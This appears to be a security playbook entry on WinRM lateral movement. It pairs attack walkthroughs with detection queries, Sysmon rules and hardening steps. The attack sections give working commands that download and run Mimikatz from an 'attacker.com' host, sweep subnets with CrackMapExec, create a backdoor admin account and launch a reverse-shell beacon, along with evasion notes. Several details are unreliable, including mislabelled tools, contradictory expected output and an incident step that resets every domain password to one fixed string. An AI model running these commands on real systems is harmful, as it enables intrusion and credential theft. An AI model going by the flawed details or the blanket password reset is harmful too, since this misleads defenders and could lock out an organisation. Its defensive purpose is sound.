# [LM-REMOTE-004]: Windows Remote Management (WinRM)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-004 |
| **MITRE ATT&CK v18.1** | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A (Inherent Windows functionality; vulnerabilities: CVE-2012-3458, CVE-2021-28440) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2012-2025, Windows 8.1+ |
| **Patched In** | N/A - Feature not removed; mitigations via policy |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Windows Remote Management (WinRM) is a Microsoft implementation of the WS-Management protocol enabling remote command execution and script execution across Windows systems. Attackers with valid domain credentials can execute arbitrary PowerShell commands remotely on target systems via WinRM, bypassing traditional firewall boundaries and leaving minimal disk artifacts. WinRM is privileged lateral movement vector because: (1) It's enabled by default on Windows Server 2012+ via Group Policy, (2) PowerShell execution via WinRM is difficult to detect, (3) It's trusted by enterprise security teams as administrative infrastructure, and (4) It integrates seamlessly with Active Directory for authentication.

**Attack Surface:** WinRM protocol (HTTP/HTTPS over ports 5985/5986), PowerShell Remoting (PSRemoting), WS-Management protocol, SOAP/XML message queue, Active Directory credentials, WinRM session management.

**Business Impact:** **Critical—Remote PowerShell execution across domain.** An attacker with domain credentials can: (1) Execute arbitrary PowerShell scripts remotely (in-memory, minimal artifacts), (2) Dump credentials from remote systems via WinRM + Mimikatz, (3) Establish persistent backdoors via scheduled tasks or WinRM session manipulation, (4) Exfiltrate data via PowerShell OneNote/Teams commands, and (5) Move laterally across the entire domain with script execution.

**Technical Context:** WinRM execution is near-instantaneous and leaves minimal artifacts on disk (execution is purely in-memory within PowerShell.exe context). Detection relies heavily on: (1) WinRM session auditing (Event ID 91, 92 - rarely enabled), (2) PowerShell Script Block Logging (requires registry modification), and (3) EDR/endpoint monitoring. Many organizations have zero visibility into WinRM lateral movement.

### Operational Risk

- **Execution Risk:** Low—Only requires valid domain credentials; WinRM is enabled by default on Server 2012+.
- **Stealth:** High—PowerShell execution via WinRM is "fileless" and trusted in most networks; traditional IDS/IPS systems miss it.
- **Reversibility:** No—Executed PowerShell commands may install persistence, modify system configuration, or exfiltrate data; changes are permanent.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 18.9.85.1 | Disable WinRM on non-server systems; enable auditing |
| **DISA STIG** | WN10-CC-000255 | Disable PowerShell Remoting on non-server workstations |
| **NIST 800-53** | AC-6 (Least Privilege), AU-2 (Audit Events), SI-4 (System Monitoring) | Restrict WinRM access; enable comprehensive auditing |
| **GDPR** | Art. 32 | Security of Processing—WinRM activity must be logged and monitored |
| **NIS2** | Art. 21 | Cyber Risk Management—monitor and restrict remote code execution |
| **ISO 27001** | A.6.2 (Access to Networks), A.12.4.1 (Event Logging) | Restrict WinRM to authorized admins; audit all usage |
| **ISO 27005** | Risk Scenario: "Unauthorized Remote Script Execution via WinRM" | Detect and contain WinRM-based lateral movement |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid domain or local credentials (standard domain user sufficient if WinRM is configured to allow user access).
- **Required Access:** Network access to target WinRM ports (TCP 5985 for HTTP, TCP 5986 for HTTPS); firewall rules permitting WinRM traffic.

**Supported Versions:**
- **Windows:** Server 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Client:** Windows 8.1+, Windows 10, Windows 11
- **PowerShell:** 3.0+ (integrated with WinRM)

**Tools Required:**
  - [PowerShell Remoting (Native - Invoke-Command)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command) (Built-in)
  - [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (Linux-based WinRM exploitation)
  - [Impacket (psexec alternative: wmiexec)](https://github.com/SecureAuthCorp/impacket) (Cross-platform WinRM access)
  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Automated WinRM lateral movement)
  - [PSJail](https://github.com/EmpireProject/Empire/blob/master/lib/modules/lateral_movement/powershell_remoting.py) (PowerShell Empire module for WinRM)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Native PowerShell Remoting (Invoke-Command)

**Supported Versions:** Windows Server 2012-2025, PowerShell 3.0+

#### Step 1: Verify WinRM is Enabled on Target

**Objective:** Confirm WinRM is listening and accessible.

**Command (PowerShell - from compromised system):**
```powershell
# Test WinRM connectivity
Test-WSMan -ComputerName target.local

# Expected output: WSManFault
# If error: "WinRM service is not responding", WinRM is disabled or inaccessible
```

**Expected Output (If WinRM is enabled):**
```
wsmid           : http://schemas.dmtf.org/wbem/wscim/1/common
ProtocolVersion : http://schemas.dmtf.org/wbem/wscim/1/protocol
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 10.0.19041 SP: 0.0 Stack: 3.0
```

**Expected Output (If WinRM is disabled):**
```
Test-WSMan : <f:WSManFault xmlns:f="http://schemas.dmtf.org/wbem/wscim/1/fault">
The WinRM service is not responding.
```

**What This Means:**
- If output contains ProductVersion, WinRM is enabled and accessible.
- Attacker can proceed to remote command execution.

#### Step 2: Execute Command via Invoke-Command

**Objective:** Execute arbitrary PowerShell command on remote system.

**Command (PowerShell):**
```powershell
# Define credentials
$Username = "DOMAIN\user"
$Password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

# Execute command on remote system
Invoke-Command -ComputerName target.local -Credential $Credential -ScriptBlock {whoami}

# Alternative: Interactive session
$Session = New-PSSession -ComputerName target.local -Credential $Credential
Invoke-Command -Session $Session -ScriptBlock {Get-LocalUser; Get-NetIPAddress}
```

**Expected Output:**
```
DOMAIN\system

WARNING: For security reasons, the host key of the remote computer should be verified
before first use.

DOMAIN\system
```

**What This Means:**
- PowerShell command executed on remote system.
- Output returned to attacker's console.
- Remote system now under attacker control (can execute any PowerShell script).

**OpSec & Evasion:**
- WinRM execution is in-memory within PowerShell.exe context; minimal disk artifacts.
- Event ID 4688 may log Process Creation if auditing enabled, but parent (WinRM) appears legitimate.
- **Mitigation:** Monitor for Invoke-Command usage; require request approval for remote sessions.
- **Detection likelihood:** Low-Medium (depends on PowerShell Script Block Logging; disabled by default).

#### Step 3: Execute Malicious Script (Credential Dumping via Mimikatz)

**Objective:** Execute Mimikatz remotely to dump credentials from target system.

**Command (PowerShell):**
```powershell
# Download Mimikatz payload in-memory
$Payload = (New-Object System.Net.WebClient).DownloadString("http://attacker.com/mimikatz.ps1")

# Execute via Invoke-Command
Invoke-Command -ComputerName target.local -Credential $Credential -ScriptBlock {
    $Payload | IEX  # IEX = Invoke-Expression; execute downloaded payload
}

# Alternative: Execute local Mimikatz binary
Invoke-Command -ComputerName target.local -Credential $Credential -ScriptBlock {
    &"C:\Windows\Temp\mimikatz.exe" 'privilege::debug' 'sekurlsa::logonpasswords'
}
```

**Expected Output:**
```
Mimikatz output (hashes, plaintext passwords, tickets, etc.)
```

**What This Means:**
- Mimikatz executed remotely with full LSASS access.
- Credentials dumped from target system.
- Attacker now has hashes/passwords for lateral movement to additional systems.

---

### METHOD 2: Evil-WinRM (Linux-based Attack)

**Supported Versions:** Windows Server 2012-2025 (attacked from Linux)

#### Step 1: Install Evil-WinRM

**Objective:** Prepare Linux-based WinRM exploitation framework.

**Command (Linux - Ubuntu/Debian):**
```bash
# Clone Evil-WinRM repository
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm

# Install Ruby dependencies
sudo apt-get install ruby-full ruby-dev
gem install evil-winrm

# Verify installation
evil-winrm --version
```

**Expected Output:**
```
EVIL-WinRM 4.3.1
```

**What This Means:**
- Evil-WinRM installed and ready for exploitation.

#### Step 2: Establish WinRM Session via Evil-WinRM

**Objective:** Create authenticated WinRM session to Windows target.

**Command (Linux):**
```bash
# Connect to target WinRM
evil-winrm -i 192.168.1.10 -u DOMAIN\\user -p Password123!

# With Kerberos ticket (if compromised AD user)
evil-winrm -i 192.168.1.10 -u DOMAIN\\user --kerberos

# Specify realm/domain
evil-winrm -i 192.168.1.10 -u user -p password -d DOMAIN

# Custom WinRM port (e.g., 5986 for HTTPS)
evil-winrm -i 192.168.1.10 -u DOMAIN\\user -p Password123! -s /path/to/cert.pem
```

**Expected Output:**
```
[*] Evil-WinRM (4.3.1)
[*] User: DOMAIN\user
[*] Target IP: 192.168.1.10
[*] Port: 5985
[+] Logged in successfully!
*Evil-WinRM* PS >
```

**What This Means:**
- WinRM session established to Windows target from Linux.
- Attacker now has PowerShell prompt on remote system.
- Can execute any PowerShell command.

#### Step 3: Execute Remote Script via Evil-WinRM

**Objective:** Run Mimikatz or other payload via WinRM session.

**Command (Evil-WinRM prompt):**
```powershell
# Once connected via evil-winrm, execute commands interactively
PS > whoami
DOMAIN\system

PS > Get-LocalUser
Administrator
Guest
DefaultAccount

PS > New-LocalUser -Name backdoor -Password (ConvertTo-SecureString "Secure123!" -AsPlainText -Force) -Description "Backdoor Account"
# Creates new user account for persistence

PS > Add-LocalGroupMember -Group "Administrators" -Member "backdoor"
# Adds user to admin group

PS > Invoke-WebRequest -Uri "http://attacker.com/beacon.exe" -OutFile "C:\Windows\Temp\beacon.exe"
PS > & "C:\Windows\Temp\beacon.exe"
# Downloads and executes reverse shell
```

**Expected Output:**
```
backdoor user created
Group membership updated
Beacon connection established
```

**What This Means:**
- Attacker has fully interactive PowerShell access.
- Created persistence backdoor (new admin account).
- Established reverse shell for continued access.

---

### METHOD 3: CrackMapExec (Automated WinRM Lateral Movement)

**Supported Versions:** Windows Server 2012-2025

#### Step 1: Enumerate WinRM-Enabled Systems

**Objective:** Identify targets with WinRM enabled and accessible.

**Command (Linux):**
```bash
# Enumerate WinRM services on network
cme winrm 192.168.1.0/24 -u user -p password -d DOMAIN --shares

# Or scan for WinRM port (5985/5986)
nmap -p 5985,5986 192.168.1.0/24 -v
```

**Expected Output:**
```
WINRM       192.168.1.10    5985     SERVER01         [*] Windows Server 2019 Enterprise (build:17763)
WINRM       192.168.1.10    5985     SERVER01         [+] DOMAIN\user (Pwn3d!)
```

**What This Means:**
- SERVER01 has WinRM enabled and accessible.
- Credentials authenticated successfully (Pwn3d! indicates compromise).

#### Step 2: Execute Commands via WinRM

**Objective:** Execute PowerShell commands across all WinRM-enabled targets.

**Command (Linux):**
```bash
# Execute whoami on all targets
cme winrm 192.168.1.0/24 -u user -p password -d DOMAIN -x 'whoami'

# Execute Mimikatz dump
cme winrm 192.168.1.0/24 -u user -p password -d DOMAIN -x 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://attacker.com/Invoke-Mimikatz.ps1")'

# Execute with specific script
cme winrm 192.168.1.10 -u user -p password -d DOMAIN -x 'Get-ADUser -Filter * -Properties *'
```

**Expected Output:**
```
WINRM       192.168.1.10    5985     SERVER01         [+] Executed command
domain\system
```

**What This Means:**
- Command executed on all WinRM-accessible targets.
- Attacker achieves network-wide lateral movement via single credential set.

---

## 4. TOOLS & COMMANDS REFERENCE

### Invoke-Command (Native PowerShell)

**Documentation:** [Microsoft Learn - Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command)

**Usage:**
```powershell
# Simple command execution
Invoke-Command -ComputerName target.local -ScriptBlock {whoami}

# With credentials
$Credential = Get-Credential
Invoke-Command -ComputerName target.local -Credential $Credential -ScriptBlock {whoami}

# Multiple targets
Invoke-Command -ComputerName server1, server2, server3 -ScriptBlock {whoami}

# With script file
Invoke-Command -ComputerName target.local -FilePath C:\script.ps1

# With arguments
Invoke-Command -ComputerName target.local -ScriptBlock {param($username) Get-ADUser $username} -ArgumentList "admin"

# Session-based (persistent)
$Session = New-PSSession -ComputerName target.local
Invoke-Command -Session $Session -ScriptBlock {whoami}
```

---

### Evil-WinRM

**Repository:** [GitHub - Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

**Installation (Linux):**
```bash
gem install evil-winrm
# Or from source
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
gem install bundler
bundle install
```

**Usage:**
```bash
# Basic connection
evil-winrm -i 192.168.1.10 -u user -p password -d DOMAIN

# With certificate (HTTPS)
evil-winrm -i 192.168.1.10 -u user -p password -d DOMAIN -S

# Specify certificate file
evil-winrm -i 192.168.1.10 -u user -p password -c /path/to/cert.pem -k /path/to/key.pem

# With Kerberos ticket
evil-winrm -i 192.168.1.10 --kerberos

# Upload files
upload /local/file C:\remote\file

# Download files
download C:\remote\file /local/file
```

---

### CrackMapExec WinRM Module

**Repository:** [GitHub - byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

**Usage:**
```bash
# Enumerate WinRM
cme winrm 192.168.1.0/24 -u user -p password

# Execute command
cme winrm 192.168.1.10 -u user -p password -d DOMAIN -x 'command'

# Execute PowerShell script
cme winrm 192.168.1.10 -u user -p password -x 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(...)"'

# Dump credentials via Mimikatz
cme winrm 192.168.1.10 -u user -p password -x 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz"'
```

---

## 5. WINDOWS EVENT LOG MONITORING

**Primary Event IDs:**

| Event ID | Source | What It Detects | Detection Difficulty |
|---|---|---|---|
| 91 | Microsoft-Windows-WinRM/Operational | WinRM session created | Medium |
| 92 | Microsoft-Windows-WinRM/Operational | WinRM session closed | Medium |
| 4688 | Security | Process creation (powershell.exe) | Low |
| 4103 | Microsoft-Windows-PowerShell/Operational | PowerShell command execution | High (requires registry mod) |
| 4104 | Microsoft-Windows-PowerShell/Operational | PowerShell Script Block Logging | High (requires registry mod) |
| 5140 | Security | Network share access (SMB) | Medium |

**Manual Configuration Steps (Enable WinRM Auditing):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable:
   - **Audit Process Creation**: Success and Failure
4. Navigate to **Audit Policies - Remote Desktop Services**:
   - **Audit Other Account Logon Events**: Success and Failure
5. Run `gpupdate /force`

**Manual Configuration Steps (Enable PowerShell Script Block Logging):**

1. **Group Policy (Server 2012+):**
   ```powershell
   # Enable via Registry
   New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
   New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWord
   ```

2. **Verify:**
   ```powershell
   Get-EventLog -LogName "Windows PowerShell" | Where-Object {$_.EventID -eq 4104} | Format-Table TimeGenerated, Message
   ```

**Detection Query (WinRM Session Creation):**
```powershell
# Find WinRM sessions
Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational" -FilterXPath "*[System[EventID=91 or EventID=92]]" | Select-Object TimeCreated, ID, Message | Format-Table
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Invoke-Command via WinRM Session

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon
- **Required Fields:** Process, CommandLine, Account, Computer
- **Alert Severity:** High
- **Frequency:** Every 10 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process creation
| where Process has_any ("powershell.exe", "pwsh.exe")
| where CommandLine has_any ("Invoke-Command", "New-PSSession", "Enter-PSSession")
| where CommandLine has_any ("ComputerName", "-i ", "target")
| summarize Count=count() by Computer, Account, Process, CommandLine
| where Count > 0
| project Computer, Account, Process, CommandLine
```

**What This Detects:**
- PowerShell process creation with Invoke-Command parameters.
- Remote session connection attempts via New-PSSession or Enter-PSSession.
- WinRM-based lateral movement.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `WinRM Remote Command Execution`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run query every: `10 minutes`
   - Lookup data: `30 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

#### Query 2: Detect WinRM Service Activity (Event ID 91/92)

**Rule Configuration:**
- **Required Table:** Event (Windows Event Log)
- **Required Fields:** EventID, Computer, Source
- **Alert Severity:** Medium
- **Frequency:** Real-time (5 minutes)

**KQL Query:**
```kusto
Event
| where Source == "Microsoft-Windows-WinRM" and (EventID == 91 or EventID == 92)
| summarize SessionCount=count() by Computer, UserName
| where SessionCount > 10  // Threshold for potential sweep
| project Computer, UserName, SessionCount
```

**What This Detects:**
- Multiple WinRM sessions created on single target (sweep pattern).
- Unusual account creating WinRM sessions.

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Config Snippet:**
```xml
<!-- Detect WinRM/PowerShell Remoting lateral movement -->
<RuleGroup name="WinRM Lateral Movement" groupRelation="or">
  <!-- Detect PowerShell with remote session parameters -->
  <ProcessCreate onmatch="include">
    <Image condition="contains">powershell.exe</Image>
    <CommandLine condition="contains any">Invoke-Command, New-PSSession, Enter-PSSession</CommandLine>
  </ProcessCreate>

  <!-- Detect WinRM service spawning PowerShell -->
  <ProcessCreate onmatch="include">
    <ParentImage condition="contains">svchost.exe</ParentImage>
    <ParentCommandLine condition="contains">WinRM</ParentCommandLine>
    <Image condition="contains">powershell.exe</Image>
  </ProcessCreate>

  <!-- Detect evil-winrm or similar tools -->
  <ProcessCreate onmatch="include">
    <Image condition="contains any">evil-winrm, winrm-ps</Image>
  </ProcessCreate>

  <!-- Detect network connections to WinRM ports -->
  <NetworkConnect onmatch="include">
    <DestinationPort>5985</DestinationPort>
    <DestinationPort>5986</DestinationPort>
  </NetworkConnect>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-winrm-config.xml` with config above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-winrm-config.xml
   ```
4. Verify WinRM-related events:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Message -match "powershell|WinRM"} | Select-Object TimeCreated, Message | Head -20
   ```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable WinRM on Non-Server Systems:**
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Remote Management (WinRM)** → **WinRM Service**
  3. Enable: **Allow remote server management through WinRM**
  4. Set to: **Disabled** (on workstations; keep enabled only on approved servers)
  5. Run `gpupdate /force`
  
  **Manual Steps (Registry - Local Policy):**
  ```powershell
  # Disable WinRM service
  Stop-Service WinRM -Force
  Set-Service WinRM -StartupType Disabled
  
  # Verify
  Get-Service WinRM | Select-Object Status, StartType
  ```
  
  **Verification:**
  ```powershell
  # Check WinRM status
  Get-Service WinRM
  # Should return: Stopped, Disabled
  ```

- **Enforce Authentication & Encryption:**
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Remote Management (WinRM)** → **WinRM Service**
  2. Enable: **Require encryption when sending data over HTTP**
  3. Set to: **True**
  4. Enable: **Basic authentication**
  5. Set to: **Disabled** (use Kerberos/Negotiate only)
  6. Run `gpupdate /force`
  
  **Manual Steps (Registry):**
  ```powershell
  # Force HTTPS/TLS encryption
  Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WinRM\Service" -Name "AllowBasic" -Value 0
  Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WinRM\Service" -Name "AllowUnencryptedTraffic" -Value 0
  ```

- **Restrict WinRM Access via Firewall:**
  
  **Manual Steps (Firewall Rules):**
  ```powershell
  # Block WinRM from non-administrative systems
  New-NetFirewallRule -DisplayName "Block WinRM (5985)" -Direction Inbound -Action Block -Protocol TCP -LocalPort 5985 -Enabled:$true
  New-NetFirewallRule -DisplayName "Block WinRM (5986)" -Direction Inbound -Action Block -Protocol TCP -LocalPort 5986 -Enabled:$true
  
  # Allow only from admin workstations (optional)
  New-NetFirewallRule -DisplayName "Allow WinRM from Admins" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 `
    -RemoteAddress "192.168.1.100,192.168.1.101" -Enabled:$true
  ```

### Priority 2: HIGH

- **Enable PowerShell Script Block Logging:**
  
  **Manual Steps (Registry):**
  ```powershell
  # Enable Script Block Logging
  New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
  New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWord -Force
  
  # Enable Module Logging
  New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force | Out-Null
  New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    -Name "EnableModuleLogging" -Value 1 -PropertyType DWord -Force
  ```

- **Implement Constrained Language Mode (PowerShell):**
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows PowerShell**
  2. Enable: **Enable PowerShell Constrained Language Mode**
  3. Set to: **Enabled**
  4. Run `gpupdate /force`
  
  **Verification:**
  ```powershell
  # Check Language Mode
  $ExecutionContext.SessionState.LanguageMode
  # Should return: ConstrainedLanguage
  ```

- **Deploy Just-In-Time (JIT) Admin Access:**
  
  **Manual Steps (Azure PIM):**
  1. Go to **Azure Portal** → **Azure AD Privileged Identity Management**
  2. Select **Azure AD roles**
  3. For **Global Administrator** role:
     - Set **Activation maximum duration**: 4 hours
     - Enable **Require approval on activation**: Yes
     - Enable **Require MFA**: Yes
  4. For **Exchange Administrators**:
     - Apply same restrictions

### Access Control & Policy Hardening

- **Conditional Access Policies:**
  - Require MFA for WinRM access to critical systems
  - Block WinRM from non-corporate networks
  - Require device compliance for WinRM sessions

- **RBAC/ABAC:**
  - Restrict WinRM access to specific security group (e.g., "WinRM_Admins")
  - Require approval for WinRM sessions to Tier 1 systems (DCs, file servers)
  - Implement attribute-based restrictions (e.g., Only during business hours 9 AM-6 PM)

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Process Execution:**
  - PowerShell.exe with Invoke-Command parameters
  - PowerShell.exe with remote connection strings (-ComputerName, -i, target)
  - PowerShell.exe spawning from WinRM service (svchost.exe -k WinRM)
  - Unusual PowerShell script blocks containing encoded commands

- **Network:**
  - Connections to WinRM ports (5985/5986) from workstations to servers
  - Multiple rapid connections to WinRM port (lateral movement sweep)
  - Connections during non-business hours

- **Event Logs:**
  - Event ID 91 (WinRM session created) from non-administrative account
  - Event ID 4104 (PowerShell Script Block Logging) with suspicious script
  - Multiple Event ID 4688 (Process Creation) for PowerShell in short timeframe

### Forensic Artifacts

- **Event Logs:**
  - Event ID 91, 92 (WinRM session creation/closure)
  - Event ID 4688 (PowerShell process creation)
  - Event ID 4104 (Script Block Logging - if enabled)
  - Event ID 5140 (Network logon)

- **Registry:**
  - `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` (Script Block Logging status)
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit` (Audit policies)

- **WinRM Logs:**
  - `C:\Windows\System32\winevt\Logs\Microsoft-Windows-WinRM-Operational.evtx`
  - WinRM session history (Event ID 91/92)

### Response Procedures

1. **Isolate System:**
   
   **Command (PowerShell):**
   ```powershell
   # Stop WinRM service
   Stop-Service WinRM -Force
   Set-Service WinRM -StartupType Disabled
   
   # Or disconnect from network
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```

2. **Collect Evidence:**
   
   **Command (PowerShell):**
   ```powershell
   # Export WinRM operational logs
   wevtutil epl "Microsoft-Windows-WinRM/Operational" C:\Evidence\WinRM.evtx
   
   # Export PowerShell logs
   wevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\Evidence\PowerShell.evtx
   
   # Get WinRM configuration
   Get-WSManInstance -ResourceURI winrm/config | Export-Csv C:\Evidence\WinRM_Config.csv
   
   # List active sessions
   Get-PSSession | Export-Csv C:\Evidence\PSSessions.csv
   ```

3. **Remediate:**
   
   **Command (PowerShell):**
   ```powershell
   # Kill all PowerShell sessions
   Get-Process powershell | Stop-Process -Force
   
   # Reset WinRM to default configuration
   winrm quickconfig -quiet
   
   # Reset all user passwords
   Get-ADUser -Filter * | Set-ADAccountPassword -NewPassword (ConvertTo-SecureString "NewPassword!" -AsPlainText -Force) -Reset
   
   # Check for persistence
   Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath, Actions
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Enumerate domain systems and administrators |
| **2** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS dump | Extract domain admin credentials |
| **3** | **Lateral Movement** | **[LM-REMOTE-004] WinRM** | **Use credentials to execute PowerShell via WinRM** |
| **4** | **Privilege Escalation** | [PE-VALID-001] Exchange ACL abuse | Escalate to Domain Admin via ACL manipulation |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware deployment | Deploy ransomware across domain via WinRM |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: APT29/Cozy Bear (State-Sponsored)

- **Target:** U.S. Treasury, CISA, SolarWinds supply chain
- **Timeline:** 2020-2021
- **Technique Status:** WinRM extensively used for lateral movement and persistence after SolarWinds compromise.
- **Attack Flow:** SolarWinds supply chain → Initial access → Credential harvesting → WinRM lateral movement across government networks → Persistence via scheduled tasks
- **Impact:** Extensive government network compromise; attributed to Russian SVR
- **Reference:** [CISA Alert on SolarWinds Compromise](https://us-cert.cisa.gov/ncas/alerts/2020/12/13/federal-government-continues-response-solarwinds-compromise)

#### Example 2: Wizard Spider / TrickBot (Ransomware Group)

- **Target:** Banking, healthcare, critical infrastructure
- **Timeline:** 2019-Present
- **Technique Status:** WinRM used as primary lateral movement mechanism; PowerShell scripts deployed for reconnaissance and persistence.
- **Attack Flow:** Initial malware → Domain enumeration → WinRM + PowerShell lateral movement → Ransomware (Conti) deployment
- **Impact:** Billions in damages; critical infrastructure disruption
- **Reference:** [FBI Alert on Conti Ransomware](https://www.fbi.gov/news/news-stories/conti-ransomware-attacks-target-healthcare-and-critical-infrastructure)

#### Example 3: FIN7 APT (Retail/Financial Targeting)

- **Target:** Retailers, payment processors, banking
- **Timeline:** 2015-Present
- **Technique Status:** WinRM + PowerShell used for lateral movement; Evil-WinRM-style exploitation documented.
- **Attack Flow:** Spear-phishing → Initial foothold → WinRM enumeration → PowerShell lateral movement → Credential dumping via remote Mimikatz execution
- **Impact:** Massive point-of-sale (POS) compromise; millions of payment cards stolen
- **Reference:** [Mandiant - FIN7 Operational Security](https://www.mandiant.com/resources/evasion-tactics-fine7-adfs-exploitation)

---

## 12. REFERENCES & SOURCES

- [Microsoft Learn - Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)
- [Microsoft Learn - Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command)
- [MITRE ATT&CK - Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/)
- [Evil-WinRM GitHub Repository](https://github.com/Hackplayers/evil-winrm)
- [CrackMapExec WinRM Module](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Tips-&-Tricks#windows-remote-management-winrm)
- [SpecterOps - PowerShell Execution Logging](https://posts.specterops.io/logging-what-windows-logon-type-is-used-when-running-powershell-over-winrm-4a2208bdf990)
- [NIST 800-53 - Remote Services Control](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)

---